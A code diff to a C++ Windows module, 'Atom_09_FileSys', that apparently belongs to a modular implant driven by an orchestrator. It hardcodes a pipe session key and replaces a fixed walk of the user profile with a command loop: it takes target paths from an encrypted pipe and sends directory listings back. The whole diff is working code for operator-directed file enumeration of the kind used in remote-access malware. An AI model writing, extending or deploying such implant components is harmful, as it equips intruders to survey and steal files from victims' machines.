@@ -8,6 +8,7 @@
 
 #include "Atom_09_FileSys.h"
 #include "../Orchestrator/AtomManager.h"
+#include <cstring>
 
 /* Skip standard junk/system directories */
 const WCHAR* g_SkipDirs[] = {
@@ -125,19 +126,29 @@ static void WalkDirectory(HANDLE hPipe, const WCHAR* szDir, BYTE* pSharedKey) {
     FindClose(hFind);
 }
 
-DWORD WINAPI FileSysAtomMain(LPVOID lpParam) {
+DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
     DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
 
-    /* Start from User Profile */
-    WCHAR szProfile[MAX_PATH] = { 0 };
-    ExpandEnvironmentStringsW(L"%USERPROFILE%", szProfile, MAX_PATH);
+    while (TRUE) {
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                // Interpret payload as path
+                WCHAR szTarget[MAX_PATH] = { 0 };
+                MultiByteToWideChar(CP_ACP, 0, (char*)inMsg.Payload, -1, szTarget, MAX_PATH);
 
-    if (szProfile[0] != L'\0') {
-        WalkDirectory(hPipe, szProfile, SharedSessionKey);
+                if (szTarget[0] != L'\0') {
+                    WalkDirectory(hPipe, szTarget, SharedSessionKey);
+                }
+            }
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
+        }
+        Sleep(500);
     }
     
     return 0;
